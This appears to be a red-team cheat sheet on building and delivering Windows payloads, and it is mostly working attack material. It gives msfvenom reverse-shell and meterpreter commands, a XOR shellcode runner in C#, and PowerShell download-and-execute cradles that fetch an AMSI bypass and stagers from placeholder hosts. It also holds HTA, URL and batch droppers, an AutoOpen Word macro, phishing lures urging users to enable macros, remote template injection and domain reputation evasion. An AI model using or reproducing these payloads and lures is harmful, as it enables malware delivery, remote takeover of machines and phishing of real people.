# Payloads Generation
## Portable Executable files
- Open with PEbear https://github.com/hasherezade/pe-bear
- Interesting sections: `text`(`.txt)`, `data`(`.data`), `resources`(`.rsrc`)

#### EXE vs DLL
- Exe are seperate programs which spawn an independant process
- DLL are modules that are loaded in existing processes

#### Example commandline exe
```
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(void) {

	printf("Test\n");
	
	getchar();
    
	return 0;
}
```

##### Build & Run
```
cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tcimplant.cpp /link /OUT:implant.exe /SUBSYSTEM:CONSOLE /MACHINE:x64

implant.exe
```

#### Example dll
```
#include <Windows.h>
#pragma comment (lib, "user32.lib")


BOOL APIENTRY DllMain(HMODULE hModule,  DWORD  ul_reason_for_call, LPVOID lpReserved) {

    switch (ul_reason_for_call)  {
    case DLL_PROCESS_ATTACH:
    case DLL_PROCESS_DETACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
        break;
    }
    return TRUE;
}

extern "C" {
__declspec(dllexport) BOOL WINAPI RunME(void) {
	
	MessageBox(
		NULL,
		"Test",
		"Message",
        MB_OK
	);
	 
		 return TRUE;
	}
}
```

##### Build & Run
```
cl.exe /D_USRDLL /D_WINDLL implantDLL.cpp /MT /link /DLL /OUT:implant.dll

rundll32 implant.dll,RunME
```

## Payload generation
- A lot of C2 frameworks such as Cobalt Strike, Metasploit etc can create their own payloads.

### Msfvenom
- Change the `-f` parameter to change the payload type. For example  `c` or `csharp`.
- Use `-e` to select an encoder and `-i` to change the iterations
- Use `EXITFUNC=thread` to get a clean exit and keep the process running [link](https://www.hacking-tutorial.com/tips-and-trick/what-is-metasploit-exitfunc/).

#### List payload & outputs & encoders
```
msfvenom --list payloads
msfvenom --list payloads | grep windows | grep x64

msfvenom --list formats

msfvenom --list encoders
```

#### Generate calc.exe
```
msfvenom -p windows/exec CMD='calc.exe' -f hex
msfvenom -p windows/x64/exec CMD='calc.exe' -f hex
```

#### Generate Messagebox payload
```
msfvenom -p windows/x64/messagebox TEXT="0xjs" -o msgbox64.bin
```

#### Generate Stageless Reverse Shell
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -e x86/shikata_ga_nai -i 11 -o msgbox64.bin
```

## Phishing
- https://github.com/ZeroPointSecurity/PhishingTemplates
- Any file downloaded via a browser (outside of a trusted zone) will be tainted with the "Mark of the Web" (MOTW).
- Files with MOTW are handled with additional security scrutiny - you may be familiar with both Windows SmartScreen and Office Protected View.
- If MS Office "block macros downloaded from the Internet" is enabled, a user cannot run a macro-enabled document even if they wanted to.
- Files that are emailed "internally" via a compromised Exchange mailbox are not tagged with a Zone Identifier.

#### Check MOTW data stream
- The possible zones are:
  - 0 Local computer
  - 1 Local intranet
  - 2 Trusted sites
  - 3 Internet
  - 4 Restricted sites
```
gc <FILE> -Stream Zone.Identifier
```

#### Web categorisation
- Domain names are categorised by vendors so that they be used for filtering purposes with for example web proxy's or firewalls.
- Two strategies for tackling this issue include:
  - Obtaining a domain that is already in a desirable category.
  - Requesting a change of category for a domain.
- Tools that may help:
  - https://sitereview.bluecoat.com/#/ 
  - https://github.com/mdsecactivebreach/Chameleon

## Scarecrow dll
- https://github.com/optiv/ScareCrow

#### Generate shellcode
```
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=443 -i 11 -f raw -o hackerman.bin
```

#### Run with scarecrow
```
ScareCrow -Loader dll -domain trendmicro.com -I shellcode.bin
```

#### Start listener
```
sudo msfconsole -q -x 'use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST <IP>; set LPORT 443; set ExitOnSession false; exploit -j -z'
```

#### Run payload
```
regsvr32.exe C:\Windows\Tasks\urlmon.dll
```

## Extra Xorred meterpreter DLL
- https://crypt0jan.medium.com/red-team-tutorials-4-616c565ccec9

#### Generate payload
- Save the payload size (byts). You need it later
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=443 --encoder x64/xor_dynamic -i 11 -f csharp > shellcode.txt
```

#### Xor payload
- https://github.com/crypt0jan/XORencoder
- ```git clone https://github.com/crypt0jan/XORencoder```
- Open the project in Visual Studio.
- Edit file ```Project.cs```, replacing the buf with your payload from Step 1
- At the top change Debug to Release and click Build XOR_encoder.
- Open the project directory ```\XORencoder\bin\Release\netcoreapp3.1\``` and run ```.\XOR_encoder.exe```
- Copy the new shellcode

#### Creating C# DLL
- Git clone https://github.com/crypt0jan/ClassLibrary1
- Paste the code from below over the code in ```Class1.cs```, to change some names.
- Edit line 39 and add the amount of bytes ```byte[] buf = new byte[1072]```
- Add the xorred shellcode.
- At the top change Debug to Release and click "Start"
- You will get an error popup but the build should succeed!

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace RunMe
{
    public class RunMeClass
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        public static void RunBaby()
        {
            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null)
            {
                return;
            }

            byte[] buf = new byte[1072]
                {  };

            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)(((uint)buf[i] ^ 0xAA) & 0xFF);
            }

            int size = buf.Length;

            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

            Marshal.Copy(buf, 0, addr, size);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}

```

#### Create a download and execute cradle
- Download the ```ClassLibrary1.dll``` file to your webserver.
- Create a ```runme.ps1``` file with the following content:
```
$data = (New-Object System.Net.WebClient).DownloadData('http://<IP>/ClassLibrary1.dll')
$assem = [System.Reflection.Assembly]::Load($data)
$class = $assem.GetType("RunMe.RunMeClass")
$method = $class.GetMethod("RunBaby")
$method.Invoke(0, $null)
```

#### Start listener
```
sudo msfconsole -q -x 'use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST <IP>; set LPORT 443; set ExitOnSession false; exploit -j -z'
```

#### Download and execute cradle PowerShell:
```
powershell.exe -nop -w hidden -C "IEX (New-Object System.Net.WebClient).downloadString('http://<IP>/runme.ps1')"
```

## HTA files
```
<html>
  <head>
    <title>Hello World</title>
  </head>
  <body>
    <h2>Hello World</h2>
    <p>This is an HTA...</p>
  </body>

  <script language="VBScript">
    Function Pwn()
      Set shell = CreateObject("wscript.Shell")
      shell.run "powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://<IP>/amsi.txt'))""; ""IEX ((new-object net.webclient).downloadstring('http://<IP>/HTTPStager.ps1'))"""
    End Function

    Pwn
  </script>
</html>
```

## URL file
```
C:\Windows\System32\cmd.exe /c powershell IEX ((new-object net.webclient).downloadstring('http://xx.xx.xx.xx/amsi.txt')); IEX ((new-object net.webclient).downloadstring('http://xx.xx.xx.xx/Invoke-PowerShellTcp2.ps1'))
```

## Bat file
```
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://xx.xx.xx.xx/amsi.txt')); IEX ((new-object net.webclient).downloadstring('http://xx.xx.xx.xx/Invoke-PowerShellTcp2.ps1'))"

C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://xx.xx.xx.xx/amsi.txt')); IEX ((new-object net.webclient).downloadstring('http://xx.xx.xx.xx/Invoke-PowerShellTcp2.ps1'))"
```

## bat2exe
- https://github.com/islamadel/bat2exe/releases/tag/2.0


## Macro's
- To prepare the document for delivery, go to File > Info > Inspect Document > Inspect Document, which will bring up the Document Inspector. Click Inspect and then Remove All next to Document Properties and Personal Information.  This is to prevent the username on your system being embedded in the document.
- Entice user to enable Macro's. Message example: "Security Product XYZ has scanned the content and deemed it to be safe.  To reveal the content, click Enable Content"

#### Simple macro
- Save it as `.doc`. Macro in a `.docx` is not possible and the `.docm` has a huge! and might get blocked by email gateways.
```
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://<IP>/shell.ps1'))"""

End Sub
```

### Template injection
- Remote Template Injection is a technique where an attacker sends a benign document to a victim, which downloads and loads a malicious template.  This template may hold a macro, leading to code execution.

#### Manual way
1. Create a word document with prefered macro. Save it as `.dot` Word 97-2003 Template (*.dot) file.`
2. Host the template on a webserver for example `http://<IP>/template.dot`
3. Create a new document with the template and save it as `.docx`.
4. Browse to the directory in Windows explorer, right-click and select 7-Zip > Open archive. Navigate to word > _rels, right-click on settings.xml.rels and select Edit.
5. Change the target entry from the one pointing to the local file to the hosted template on the webserver. `Target="http://<IP>/template.dot"`

#### Automated
- https://github.com/JohnWoodman/remoteinjector

```
python3 remoteinjector.py -w http://<IP>/template.dot document.docx
```

## HTML Smuggling
- https://outflank.nl/blog/2018/08/14/html-smuggling-explained/
